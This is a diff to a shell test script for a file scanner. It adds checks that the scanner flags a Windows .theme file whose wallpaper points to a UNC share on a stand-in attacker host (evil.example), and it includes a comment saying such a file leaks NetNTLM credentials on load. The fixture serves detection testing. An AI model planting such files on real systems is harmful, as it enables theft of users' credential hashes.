@@ -7636,6 +7636,21 @@ printf 'tasks:\n  - init: npm ci\n    command: npm run dev\n' \
     || check "pkg: plain gitpod tasks clean" "0" "1"
 rm -rf "$PDIR"
 
+# ── cycle-27: .theme UNC NetNTLM leak + new secret formats ──
+# .theme [Slideshow]/Wallpaper pointing at a UNC leaks NetNTLM on load
+TDIR=$(mktemp -d)
+printf '[Theme]\n[Control Panel\\Desktop]\nWallpaper=\\\\evil.example\\share\\img.jpg\n' \
+    > "$TDIR/leak.theme"
+./hlse_core file "$TDIR/leak.theme" 2>&1 | grep -q "SHELL-META" \
+    && check "file: .theme UNC wallpaper flagged" "0" "0" \
+    || check "file: .theme UNC wallpaper flagged" "0" "1"
+printf '[Theme]\n[Control Panel\\Desktop]\nWallpaper=C:\\Windows\\img.jpg\n' \
+    > "$TDIR/ok.theme"
+./hlse_core file "$TDIR/ok.theme" 2>&1 | grep -q "F10" \
+    && check "file: local .theme not shell-meta" "0" "1" \
+    || check "file: local .theme not shell-meta" "0" "0"
+rm -rf "$TDIR"
+
 # ─── results ────────────────────────────────────────────────────────────
 
 echo ""
